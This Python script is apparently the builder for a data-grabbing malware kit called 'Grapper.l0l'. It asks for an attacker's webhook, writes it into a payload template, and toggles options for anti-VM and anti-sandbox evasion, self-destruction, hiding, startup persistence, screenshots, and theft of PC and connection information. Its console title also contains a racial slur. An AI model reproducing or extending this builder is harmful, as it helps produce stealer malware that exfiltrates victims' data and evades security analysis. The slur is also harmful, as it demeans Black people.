import os
try:
    import requests
    from colorama import Fore
    from tkinter import messagebox

except:
    print("Seems like u dont have required pacages... installing them now")
    print("Updating pip")
    os.system("python.exe -m pip install --upgrade pip")
    os.system("cls")
    i = 0
    for pac in ["requests", "colorama"]:
        os.system(f"title Grapper.l0l - Installing {pac}")
        i += 1
        os.system(f"pip install -q {pac}")
        print(f"{pac} installed {i}/2")
    import requests
    from colorama import Fore
    from tkinter import messagebox

red = Fore.RED
lred = Fore.LIGHTRED_EX
yellow = Fore.YELLOW
lyellow = Fore.LIGHTYELLOW_EX
green = Fore.GREEN
lgreen = Fore.LIGHTGREEN_EX
res = Fore.RESET
purple = Fore.LIGHTMAGENTA_EX
magenta = Fore.MAGENTA
black = Fore.LIGHTBLACK_EX

print("Copying code...")
with open("resources/code.py", "r") as src:
    source_code = src.read()

with open("resources/build.py", "w") as des:
    des.write(source_code)

def ask(pyt, var):
    c = input(f"{red}[{res}{pyt}{red}] {black}(y/n) {lred}> ")
    if c == "y":
        with open("resources/build.py", "r") as f:
            content = f.read()
        new_content = content.replace(f"{var} = False", f"{var} = True")
        with open("resources/build.py", "w") as f:
            f.write(new_content)
    elif c == "n":
        pass
    else:
        print(f"{red}[{res}!{red}]{lred} Not a valid input use y or n")

os.system("cls")
os.system("title Grapper.L0L - Grabbing some nigga $$$")
print(f"""{Fore.RED}
 ██████  ██████   █████  ██████  ███████ ██████     ██       ██████  ██      
██       ██   ██ ██   ██ ██   ██ ██      ██   ██    ██      ██  ████ ██      
██   ███ ██████  ███████ ██████  █████   ██████     ██      ██ ██ ██ ██      
██    ██ ██   ██ ██   ██ ██      ██      ██   ██    ██      ████  ██ ██      
 ██████  ██   ██ ██   ██ ██      ███████ ██   ██ ██ ███████  ██████  ███████                                                                            
""")

def get_wb():
    wb = input(f"{red}[{res}WebHook{red}]{lred} > ")
    try:
        print(f"{red}Checking webhook...")
        r = requests.head(wb)
        if r.status_code == 200:
            print(f"{green}Valid {black}({r.status_code})")
            with open("resources/code.py", "r") as f:
                content = f.read()
                new_content = content.replace("wb = ''", f"wb = '{wb}'")
            with open("resources/build.py", "w") as f:
                f.write(new_content)
        else:
            print(f"{red}Invalid {black}({r.status_code})")
            messagebox.showerror("Grapper.l0l", "Webhook is not valid brugh")
            get_wb()
    except Exception as e:
        print(f"{red}Error {black} {e}")
        messagebox.showerror("Grapper.l0l", "Error while checking webhook")
        get_wb()

get_wb()

ask("Anti VM", "anti_vm")
ask("Anti Virus total", "anti_vt")
ask("Anti any.run (free only)", "anti_arun")
ask("Auto desturct file", "destruct")
ask("Hide", "hide")
ask("Screenshoot", "ss")
ask("Startup", "startup")
ask("Connection info", "con_info")
ask("PC info", "pc_info")


#def ask_othr():
#    c = input(f"{red} Do you want to continue to pc damaging/dangarous options? {black}(y/n)")
#    if c == "y":
#        exit()
#    elif c == "n":
#        pass
#    else:
#        print(f"{red}[{res}!{red}]{lred} Not a valid input use y or n")

#ask_othr()
messagebox.showinfo("Grapper.l0l", "Build made!")
